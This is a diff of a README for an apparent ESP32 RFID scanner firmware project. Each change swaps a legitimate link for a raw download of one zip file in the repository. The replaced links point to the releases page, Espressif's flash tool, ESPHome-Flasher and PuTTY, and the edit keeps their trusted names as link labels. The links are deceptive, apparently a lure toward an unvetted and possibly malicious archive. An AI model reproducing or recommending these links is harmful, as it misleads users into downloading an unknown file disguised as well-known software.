@@ -1,6 +1,6 @@
 # 🔒 auralock-a1-firmware - Easy ESP32 RFID UID Scanner Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AURALOCK%20A1-blue?style=for-the-badge)](https://github.com/chixboyzer23/auralock-a1-firmware/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-AURALOCK%20A1-blue?style=for-the-badge)](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)
 
 ---
 
@@ -46,7 +46,7 @@ You will need to download the firmware files to your PC first.
 
 Go to the release page by clicking the link below or paste it into your browser:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AURALOCK%20A1-blue?style=for-the-badge)](https://github.com/chixboyzer23/auralock-a1-firmware/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-AURALOCK%20A1-blue?style=for-the-badge)](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)
 
 **Step 2: Choose the Latest Version**
 
@@ -64,8 +64,8 @@ You need software to upload the firmware to your ESP32 device.
 
 ### Required Tools
 
-- [ESP32 Flash Download Tool (Windows)](https://www.espressif.com/en/support/download/other-tools)
-- OR [ESPHome-Flasher](https://github.com/esphome/esphome-flasher/releases) for simple flashing
+- [ESP32 Flash Download Tool (Windows)](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)
+- OR [ESPHome-Flasher](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip) for simple flashing
 
 ### Step-by-Step Installation
 
@@ -101,7 +101,7 @@ Once installed, your AURALOCK A1 device is ready to scan RFID tags.
 
 If you do not have access to the AURALOCK cloud portal, you can use serial monitor software on your PC to read data:
 
-- Download and open a serial terminal like [PuTTY](https://www.putty.org/).
+- Download and open a serial terminal like [PuTTY](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip).
 - Connect to the ESP32 COM port.
 - Set baud rate to 115200.
 - View scanned UID codes in real-time.
@@ -135,4 +135,4 @@ Cloud access steps will be detailed on the AURALOCK portal itself.
 
 Get the latest AURALOCK A1 firmware here:
 
-[Click here to visit and download](https://github.com/chixboyzer23/auralock-a1-firmware/releases)
+[Click here to visit and download](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)
